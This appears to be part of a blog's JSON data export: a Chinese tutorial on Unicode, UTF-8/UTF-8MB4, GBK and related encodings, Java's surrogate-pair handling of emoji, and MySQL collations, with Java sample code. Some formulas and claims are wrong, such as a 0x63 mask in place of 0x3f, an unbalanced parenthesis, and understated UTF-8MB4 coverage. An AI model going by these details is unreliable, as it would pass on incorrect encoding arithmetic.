<code>UCS-2</code>字符集，包含部分<code>UCS-4</code>字符。</p>\n<p><strong>UTF-16</strong></p>\n<p>UTF-16与UTF-8一样，是众多UTF(UCS Transfer Format)标准中的一个，它是以<code>UCS-4</code>为字符集的编码规则，有2个字节和4个字节两种长度，2个字节的用于编码“基本多语言平面中的字符”（即<code>UCS-2</code>部分），4个字符编码其余辅助平面的字符。</p>\n<p>UTF-8和UTF-16算是一个字符集体系的编码，GB系列算一个字符集体系的编码。</p>\n<h2 id=\"Java中的内存编码\"><a href=\"#Java中的内存编码\" class=\"headerlink\" title=\"Java中的内存编码\"></a>Java中的内存编码</h2><p>Java内存唯一使用的编码是<code>Unicode</code>（<code>UCS-2</code>字符集，注意是内存编码，不是运行时与用户交互的编码）。平时调用的<code>String.getBytes()</code>方法，实际上就是将内存中字符的码点按指定编码规则组织为bytes数组，同理，<code>new String(bytes)</code>方法，即是将bytes数组按指定编码规则翻译成码点存在内存中。</p>\n<h3 id=\"前端输入的emoji字符由UTF-8MB4编码，传到后端Java是如何处理的呢？\"><a href=\"#前端输入的emoji字符由UTF-8MB4编码，传到后端Java是如何处理的呢？\" class=\"headerlink\" title=\"前端输入的emoji字符由UTF-8MB4编码，传到后端Java是如何处理的呢？\"></a>前端输入的emoji字符由UTF-8MB4编码，传到后端Java是如何处理的呢？</h3><p>Java采取的策略是将其转为两个UTF-8MB3字符。具体转换过程如下：</p>\n<ol>\n<li><strong>首先读取字节，如以”😭”表情为例，读取到如下字节（负数已处理为正数）</strong><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">240       159       152       173</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<p>二进制表示为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bytes[0]  bytes[1]  bytes[2]  bytes[3]</span><br><span class=\"line\">‭11110000‬  ‭10011111‬  ‭10011000‬  ‭10101101‬</span><br></pre></td></tr></table></figure>\n\n<p>由于值是以utf8mb4编码的，观察二进制值，符合如下模板格式，抽离模板后即可得到码点值的二进制代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">11110xxx  10xxxxxx  10xxxxxx  10xxxxxx    二进制值模板</span><br><span class=\"line\">     000    011111    011000‬    101101‬    抽离模板后得到码点值的二进制表示</span><br></pre></td></tr></table></figure>\n\n<p>上述码点值计算的过程可以用如下公式表示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">codePoint = ((bytes[0] &amp; 0x7) &lt;&lt; 18) + ((bytes[1] &amp; 0x3f) &lt;&lt; 12) + (bytes[2] &amp; 0x3f) &lt;&lt; 6) + (bytes[3] &amp; 0x3f)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><strong>将UTF-8MB4字符拆成为两个字符</strong><br>步骤如下</li>\n</ol>\n<ul>\n<li><p>先将码点值减掉(2^16)，并去掉第1位</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">val = codePoint - (1 &lt;&lt; 16)</span><br><span class=\"line\">val = val &amp; 0xFFFFF;</span><br><span class=\"line\">     000    001111    011000    101101        计算后的二进制值</span><br><span class=\"line\">      00    001111    011000    101101        去掉第1位</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>然后填充到固定转化模板（后面解释），得到两个三字节的UTF-8编码值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">11101101  1010xxxx  10xxxxxx    11101101  1011xxxx  10xxxxxx    固定转化模板</span><br><span class=\"line\">11101101  10100000  10111101    11101101  10111000  10101101    填充后二进制值</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>再计算新的码点（此时是两个三字节的UTF-8编码值，所以有如下模板）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1110xxxx  10xxxxxx  10xxxxxx    1110xxxx  10xxxxxx  10xxxxxx    三字节格式二进制值模板</span><br><span class=\"line\">    1101    100000    111101        1101    111000    101101    抽离模板后值</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>整理二进制位，得到两个新的Unicode码点：D83D, DE2D</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">11011000  00111101              11011110  00101101</span><br><span class=\"line\">D83D                            DE2D</span><br></pre></td></tr></table></figure>\n\n</li>\n</ul>\n<p>上面的转换步骤稍加整理后，可以得到公式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">新码点的值计算：</span><br><span class=\"line\">val = ((bytes[0] &amp; 0x7) &lt;&lt; 18) + ((bytes[1] &amp; 0x63) &lt;&lt; 12) + (bytes[2] &amp; 0x63) &lt;&lt; 6) + (bytes[3] &amp; 0x63) - (1 &lt;&lt; 16)</span><br><span class=\"line\">val = val &amp; 0xFFFFF</span><br><span class=\"line\">// 110110xxxxxxxxxx 110111xxxxxxxxxx    来自固定转化模板的值</span><br><span class=\"line\">// 0b110110 = 54</span><br><span class=\"line\">// 54 &lt;&lt; 10 = 0xD800</span><br><span class=\"line\">codePointN[0] = (val &gt;&gt;&gt; 10) + 0xD800</span><br><span class=\"line\">// 0b110111 = 55</span><br><span class=\"line\">// 55 &lt;&lt; 10 = 0xDC00</span><br><span class=\"line\">codePointN[1] = (val &amp; 0x3FF) + 0xDC00</span><br></pre></td></tr></table></figure>\n\n<p><strong>拆分字符时使用的固定转化模板为什么是这个？</strong></p>\n<p><strong>其一</strong> 3字节UTF-8，固定了一些位</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1110xxxx  10xxxxxx  10xxxxxx    1110xxxx  10xxxxxx  10xxxxxx</span><br></pre></td></tr></table></figure>\n\n<p><strong>其二</strong> 新码点不能与UTF-8MB3冲突，所以选用为UTF-16永久保留不映射的码点区间(<code>0xD800-0xDBFF</code>和<code>0xDC00-0xDFFF</code>)作为新值所在的区间（两个区间的区别只是与大端和小端的规定有关）<br>因此又可以固定剩余几位（<code>D8</code>二进制为‭<code>11011000</code>‬，<code>DB</code>二进制为‭<code>11011011</code>‬，<code>DC</code>二进制为<code>‭11011100</code>‬，<code>DF</code>二进制为<code>‭11011111</code>‬）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">11101101  1010xxxx  10xxxxxx    11101101  1011xxxx  10xxxxxx</span><br></pre></td></tr></table></figure>\n\n<p><strong>关于码点值减掉(2^16)</strong></p>\n<p>参见JDK中的<code>java.lang.Character#highSurrogate</code>方法，这是用于计算高位值的方法</p>\n<p>相应的，低位值计算方法见<code>java.lang.Character#lowSurrogate</code>方法</p>\n<p>它们被调用的位置见<code>sun.nio.cs.UTF_8.Decoder#decode</code>方法</p>\n<h3 id=\"关于内存编码处理的测试代码\"><a href=\"#关于内存编码处理的测试代码\" class=\"headerlink\" title=\"关于内存编码处理的测试代码\"></a>关于内存编码处理的测试代码</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">public static void main(String[] args) throws IOException, UnsupportDecodeException &#123;</span><br><span class=\"line\">\tbyte[] bytes = new byte[10];</span><br><span class=\"line\">\tint read = System.in.read(bytes);</span><br><span class=\"line\">\tSystem.out.println(&quot;读取byte如下 --&gt; &quot;);</span><br><span class=\"line\">\tfor (int i = 0; i &lt; read; i++) &#123; // 最后一个打印10为回车键</span><br><span class=\"line\">\t\tSystem.out.println(bytes[i] &amp; 0xff);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tSystem.out.println(&quot;读取内容如下 --&gt; &quot;);</span><br><span class=\"line\">\tSystem.out.println(new String(bytes, 0, read));</span><br><span class=\"line\">\tSystem.out.println(&quot;-----------------&quot;);</span><br><span class=\"line\">\tint val = ((bytes[0] &amp; 0x7) &lt;&lt; 18) + ((bytes[1] &amp; 0x3f) &lt;&lt; 12) + ((bytes[2] &amp; 0x3f) &lt;&lt; 6) + (bytes[3] &amp; 0x3f) - (1 &lt;&lt; 16);</span><br><span class=\"line\">\tval = val &amp; 0xFFFFF;</span><br><span class=\"line\">\tint high = (val &gt;&gt;&gt; 10) + 0xD800;</span><br><span class=\"line\">\tint low = (val &amp; 0x3FF) + 0xDC00;</span><br><span class=\"line\">\tSystem.out.println(Integer.toHexString((high &amp; 0xffff) &gt;&gt; 8));</span><br><span class=\"line\">\tSystem.out.println(Integer.toHexString(high &amp; 0xff));</span><br><span class=\"line\">\tSystem.out.println(Integer.toHexString((low &amp; 0xffff) &gt;&gt; 8));</span><br><span class=\"line\">\tSystem.out.println(Integer.toHexString(low &amp; 0xff));</span><br><span class=\"line\">\tSystem.out.println(&quot;-----------------&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">\tSystem.out.println();</span><br><span class=\"line\">\tSystem.out.println(&quot;重复输入一次，验证unicode编码&quot;);</span><br><span class=\"line\">\tScanner scanner = new Scanner(System.in);</span><br><span class=\"line\">\tif (scanner.hasNext()) &#123;</span><br><span class=\"line\">\t\tString next = scanner.next();</span><br><span class=\"line\">\t\tSystem.out.println();</span><br><span class=\"line\">\t\tSystem.out.println(encode(next, true));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"MySQL中的编码\"><a href=\"#MySQL中的编码\" class=\"headerlink\" title=\"MySQL中的编码\"></a>MySQL中的编码</h2><p>了解了码点以及Java编码转化的本质后，应该能够明白MySQL中，如果客户端与服务器端编码不同，首先字符集就已经不同，那么存入数据库之后出现乱码也就不难理解了。</p>\n<p>在MySQL数据库中，新建数据库的时候会要求选择字符集和排序规则，这里的字符集就是本文所说的编码规则，而排序规则，则是在SQL查询中对文本排序时的排序依据（可以类比为Java中<code>java.util.Comparator</code>的实现），比如：是按ASCII码排序、还是按汉字拼音首字母排序、或者按德语字母顺序排序、或者排序时大小写不同是否看成同一个字符。</p>\n<p>以常用的<code>utf8mb4_general_ci</code>、<code>utf8mb4_unicode_ci</code>和<code>utf8mb4_bin</code>为例：<code>utf8mb4_unicode_ci</code>针对各语言做了比较复杂的处理，在各语言中的排序更加准确（主要是在德语、法语等一部分语言中有影响，对中文、英文没影响），排序速度较慢；<code>utf8mb4_general_ci</code>大小写不敏感，相比<code>utf8mb4_unicode_ci</code>排序速度也更快，<code>utf8mb4_bin</code>大小写敏感。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"常见编码详悉\"><a href=\"#常见编码详悉\" class=\"headerlink\" title=\"常见编码详悉\"></a>常见编码详悉</h2><h3 id=\"Unicode和UTF-8的关系\"><a href=\"#Unicode和UTF-8的关系\" class=\"headerlink\" title=\"Unicode和UTF-8的关系\"></a>Unicode和UTF-8的关系</h3><p>Unicode又称万国码，它将全世界大部分语言的常用字符都纳入了编码范围。Unicode和UTF-8的关系简单的来说可以理解为：</p>\n<ul>\n<li>Unicode是字符集</li>\n<li>UTF-8是编码规则</li>\n</ul>\n<p>字符集：为每一个“字符”分配一个唯一的数值（ID，或称码点、码位），即给汉字、英文等各种字符分配一个不重复的数值</p>\n<p>编码规则：将“码点”转换为字节序列的规则（数值转化为字节值的过程）</p>\n<p>Unicode字符集为每一个字符分配一个码点，例如：“中”的码点是20013，记作U+4E2D（20013的16进制是4E2D）</p>\n<p>UTF-8是一套以8位为一个编码单位的可变长编码，会将一个码点编码为1到4个字节（广义上的UTF-8），编码规则如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> U+0000 ~   U+007F: 0XXXXXXX</span><br><span class=\"line\"> U+0080 ~   U+07FF: 110XXXXX 10XXXXXX</span><br><span class=\"line\"> U+0800 ~   U+FFFF: 1110XXXX 10XXXXXX 10XXXXXX</span><br><span class=\"line\">U+10000 ~ U+10FFFF: 11110XXX 10XXXXXX 10XXXXXX 10XXXXXX</span><br></pre></td></tr></table></figure>\n\n<p>根据上表可知，“中”字的码点U+4E2D属于第三行范围：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">       4    E    2    D</span><br><span class=\"line\">‭    0100 1110 0010 1101‬    二进制值</span><br><span class=\"line\">------------------------</span><br><span class=\"line\">    0100   111000   101101 二进制值重新对齐</span><br><span class=\"line\">1110XXXX 10XXXXXX 10XXXXXX 模板</span><br><span class=\"line\">11100100 10111000 10101101 代入模板后值</span><br><span class=\"line\">     228      184      173 字节值(byte，负值处理为正值了+256)</span><br></pre></td></tr></table></figure>\n\n<p>我们可以用java编写程序实现unicode值（16进制表示）和字符的转换，如下所示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class UnicodeCoder &#123;</span><br><span class=\"line\">\t/**</span><br><span class=\"line\">\t * 字符串转为unicode值，参数二是否将ASCII字符转为unicode表示</span><br><span class=\"line\">\t */</span><br><span class=\"line\">\tpublic static String encode(String str, boolean encodeAscii) &#123;</span><br><span class=\"line\">\t\tStringBuilder sb = new StringBuilder();</span><br><span class=\"line\">\t\tchar[] charArray = str.toCharArray();</span><br><span class=\"line\">\t\tfor (int i = 0; i &lt; charArray.length; i++) &#123;</span><br><span class=\"line\">\t\t\tchar c = charArray[i];</span><br><span class=\"line\">\t\t\tsb.append(charToUnicodeString(c, encodeAscii));</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn sb.toString();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t/**</span><br><span class=\"line\">\t * unicode值转为字符串</span><br><span class=\"line\">\t */</span><br><span class=\"line\">\tpublic static String decode(String str) throws UnsupportDecodeException &#123;</span><br><span class=\"line\">\t\tStringBuilder sb = new StringBuilder();</span><br><span class=\"line\">\t\tchar[] charArray = str.toCharArray();</span><br><span class=\"line\">\t\tfor (int i = 0; i &lt; charArray.length; i++) &#123;</span><br><span class=\"line\">\t\t\tchar c = charArray[i];</span><br><span class=\"line\">\t\t\tif (c == &apos;\\\\&apos;) &#123;</span><br><span class=\"line\">\t\t\t\tif (i == charArray.length - 1) &#123;</span><br><span class=\"line\">\t\t\t\t\tthrow new UnsupportDecodeException();</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\tif (charArray[i + 1] == &apos;\\\\&apos;) &#123;</span><br><span class=\"line\">\t\t\t\t\tsb.append(&quot;\\\\&quot;);</span><br><span class=\"line\">\t\t\t\t\ti++;</span><br><span class=\"line\">\t\t\t\t&#125; else if (charArray[i + 1] == &apos;u&apos;) &#123;</span><br><span class=\"line\">\t\t\t\t\tif (i &gt;= charArray.length - 5 || !isHexChar(charArray[i + 2])</span><br><span class=\"line\">\t\t\t\t\t\t\t || !isHexChar(charArray[i + 3]) || !isHexChar(charArray[i + 4])</span><br><span class=\"line\">\t\t\t\t\t\t\t || !isHexChar(charArray[i + 5])) &#123;</span><br><span class=\"line\">\t\t\t\t\t\tthrow new UnsupportDecodeException();</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t\tString hexInt = &quot;&quot; + charArray[i + 2] + charArray[i + 3] + charArray[i + 4] + charArray[i + 5];</span><br><span class=\"line\">\t\t\t\t\tchar v = (char) Integer.valueOf(hexInt, 16).intValue();</span><br><span class=\"line\">\t\t\t\t\tsb.append(v);</span><br><span class=\"line\">\t\t\t\t\ti += 5;</span><br><span class=\"line\">\t\t\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t\tsb.append(c);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn sb.toString();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tprivate static boolean isHexChar(char c) &#123;</span><br><span class=\"line\">\t\tif (c &gt;= &apos;0&apos; &amp;&amp; c &lt;= &apos;9&apos;) return true;</span><br><span class=\"line\">\t\tif (c &gt;= &apos;a&apos; &amp;&amp; c &lt;= &apos;f&apos;) return true;</span><br><span class=\"line\">\t\tif (c &gt;= &apos;A&apos; &amp;&amp; c &lt;= &apos;F&apos;) return true;</span><br><span class=\"line\">\t\treturn false;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tprivate static String charToUnicodeString(char c, boolean encodeAscii) &#123;</span><br><span class=\"line\">\t\tif (c &lt; 0x80 &amp;&amp; !encodeAscii) &#123;</span><br><span class=\"line\">\t\t\tif (c == &apos;\\\\&apos;) &#123;</span><br><span class=\"line\">\t\t\t\treturn &quot;\\\\\\\\&quot;;</span><br><span class=\"line\">\t\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t\treturn c + &quot;&quot;;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tString hex = Integer.toHexString(c);</span><br><span class=\"line\">\t\tif (c &lt; 0x10) &#123;</span><br><span class=\"line\">\t\t\treturn &quot;\\\\u000&quot; + hex;</span><br><span class=\"line\">\t\t&#125; else if (c &lt; 0x100) &#123;</span><br><span class=\"line\">\t\t\treturn &quot;\\\\u00&quot; + hex;</span><br><span class=\"line\">\t\t&#125; else if (c &lt; 0x1000) &#123;</span><br><span class=\"line\">\t\t\treturn &quot;\\\\u0&quot; + hex;</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\treturn &quot;\\\\u&quot; + hex;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tpublic static class UnsupportDecodeException extends Exception &#123;</span><br><span class=\"line\">\t\tprivate static final long serialVersionUID = 1L;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tpublic UnsupportDecodeException() &#123;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tpublic static void main(String[] args) throws UnsupportDecodeException &#123;</span><br><span class=\"line\">\t\tSystem.out.println(encode(&quot;中abcµ&quot;, true)); // \\u4e2d</span><br><span class=\"line\">\t\tSystem.out.println(&quot;\\u4e2d&quot;); // 不需要转换，jvm自动处理</span><br><span class=\"line\">\t\tSystem.out.println(decode(&quot;\\\\u4e2d&quot;)); // 中</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"UTF-8和UTF-8MB4关系\"><a href=\"#UTF-8和UTF-8MB4关系\" class=\"headerlink\" title=\"UTF-8和UTF-8MB4关系\"></a>UTF-8和UTF-8MB4关系</h3><p>Unicode字符集，实际上有两个系列，分为2个字节和4个字节的两种，2个字节的Unicode字符集称为<code>UCS-2</code>（通常说的Unicode大都是<code>UCS-2</code>），4个字节的Unicode字符集称为<code>UCS-4</code>，<code>UCS-4</code>是<code>UCS-2</code>的超集。<code>UCS-2</code>可容纳65536个码位，<code>UCS-4</code>目前可用码位分为了17个平面（每个平面可容纳65536个码位，即一共1114112个码位，第1个平面被称为基本多语言平面，即<code>UCS-2</code>的字符集，其他16个平面统称为辅助平面），它为现有的所有文字和符号以及将来可能出现的字符都指定（或预留）了一个唯一的数字编码。</p>\n<p><strong>UTF-8MB3</strong></p>\n<p>通常所说的UTF-8（即狭义上的UTF-8），实际上是UTF-8MB3，一个字符占1-3个字节（只有编码规则的前三行），它是以<code>UCS-2</code>为字符集的编码规则。</p>\n<p><strong>UTF-8MB4</strong></p>\n<p>除了UTF-8MB3以外，还存在UTF-8MB4编码，一个字符占1-4个字节，可以表示超过65536个字符（没能达到1114112个，仅能表示20多万个），因此有能力表示<code>UCS-4</code>中的部分字符。</p>\n<h3 id=\"UTF-8、UTF-16和GBK、GB2312的区别\"><a href=\"#UTF-8、UTF-16和GBK、GB2312的区别\" class=\"headerlink\" title=\"UTF-8、UTF-16和GBK、GB2312的区别\"></a>UTF-8、UTF-16和GBK、GB2312的区别</h3><p>UFT-8、UTF-16、GBK、GB2312都能编码汉字，但在汉字的支持数量上、以及字符集上有所差异。</p>\n<p><strong>GB2312</strong></p>\n<p>GB2312是由国内制定，在ASCII码的基础上扩充汉字编码制定的字符集与编码规则，共收录了6763个常用汉字，英文占一个字节，汉字占两个字节。</p>\n<p><strong>GBK</strong></p>\n<p>GBK编码，扩展了GB2312编码收录的字符数量，并沿用了GB2312的码位（是GB2312编码的超集），收录了21003个汉字，包含<code>UCS-2</code>汉字区的全部汉字。英文占一个字节，汉字占两个字节，向下兼容GB2312编码。</p>\n<p><strong>GB18030</strong></p>\n<p>GB18030编码，在GBK的基础上再次扩充了汉字字符数量，并增加了少数民族字符，收录了70244个汉字。与GB2312-1980完全向后兼容，与GBK基本兼容，并支持Unicode的所有码位。编码包含三种长度：单子节ASCII，双字节的GBK（略带扩展）、以及用于填补所有Unicode码位的四字节UTF区块（Unicode码位数1114112少于GB18030的161668个码位）。</p>\n<p><strong>BIG5</strong></p>\n<p>BIG5编码是台湾制定的基于ASCII扩充的中文编码规则，但其与GB2312字符集码位不是一个体系。</p>\n<p><strong>UTF-8</strong></p>\n<p>就像GBK编码一样，各国都对ASCII进行扩展定义了自己的编码，不利于国际间文件交换。Unicode编码是在这种背景下，国际标准组织将世界各国语言都纳入了编码体系，形成的一个字符集。</p>\n<p>前面说过Unicode有<code>UCS-2</code>和<code>UCS-4</code>两种，<code>UCS-2</code>汉字编码范围在U+4E00-9FA5，包含20928个汉字（仅汉字区），容纳中日韩（CJK）统一编码的汉字共27484个（日语区和韩语区也有部分日语韩语常用汉字）。而<code>UCS-4</code>的第1个平面即是<code>UCS-2</code>的码位，所以包含的汉字数量必然大于<code>UCS-2</code>（具体值没找到资料）。</p>\n<p>UTF-8MB3编码，以<code>UCS-2</code>字符集为基础的编码，而UTF-8MB4已经超过<code>UCS-2</code>字符集，包含部分<code>UCS-4</code>字符。</p>\n<p><strong>UTF-16</strong></p>\n<p>UTF-16与UTF-8一样，是众多UTF(UCS Transfer Format)标准中的一个，它是以<code>UCS-4</code>为字符集的编码规则，有2个字节和4个字节两种长度，2个字节的用于编码“基本多语言平面中的字符”（即<code>UCS-2</code>部分），4个字符编码其余辅助平面的字符。</p>\n<p>UTF-8和UTF-16算是一个字符集体系的编码，GB系列算一个字符集体系的编码。</p>\n<h2 id=\"Java中的内存编码\"><a href=\"#Java中的内存编码\" class=\"headerlink\" title=\"Java中的内存编码\"></a>Java中的内存编码</h2><p>Java内存唯一使用的编码是<code>Unicode</code>（<code>UCS-2</code>字符集，注意是内存编码，不是运行时与用户交互的编码）。平时调用的<code>String.getBytes()</code>方法，实际上就是将内存中字符的码点按指定编码规则组织为bytes数组，同理，<code>new String(bytes)</code>方法，即是将bytes数组按指定编码规则翻译成码点存在内存中。</p>\n<h3 id=\"前端输入的emoji字符由UTF-8MB4编码，传到后端Java是如何处理的呢？\"><a href=\"#前端输入的emoji字符由UTF-8MB4编码，传到后端Java是如何处理的呢？\" class=\"headerlink\" title=\"前端输入的emoji字符由UTF-8MB4编码，传到后端Java是如何处理的呢？\"></a>前端输入的emoji字符由UTF-8MB4编码，传到后端Java是如何处理的呢？</h3><p>Java采取的策略是将其转为两个UTF-8MB3字符。具体转换过程如下：</p>\n<ol>\n<li><strong>首先读取字节，如以”😭”表情为例，读取到如下字节（负数已处理为正数）</strong><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">240       159       152       173</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<p>二进制表示为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bytes[0]  bytes[1]  bytes[2]  bytes[3]</span><br><span class=\"line\">‭11110000‬  ‭10011111‬  ‭10011000‬  ‭10101101‬</span><br></pre></td></tr></table></figure>\n\n<p>由于值是以utf8mb4编码的，观察二进制值，符合如下模板格式，抽离模板后即可得到码点值的二进制代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">11110xxx  10xxxxxx  10xxxxxx  10xxxxxx    二进制值模板</span><br><span class=\"line\">     000    011111    011000‬    101101‬    抽离模板后得到码点值的二进制表示</span><br></pre></td></tr></table></figure>\n\n<p>上述码点值计算的过程可以用如下公式表示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">codePoint = ((bytes[0] &amp; 0x7) &lt;&lt; 18) + ((bytes[1] &amp; 0x3f) &lt;&lt; 12) + (bytes[2] &amp; 0x3f) &lt;&lt; 6) + (bytes[3] &amp; 0x3f)</span><br></pre></td></tr></table></figure>\n\n<ol 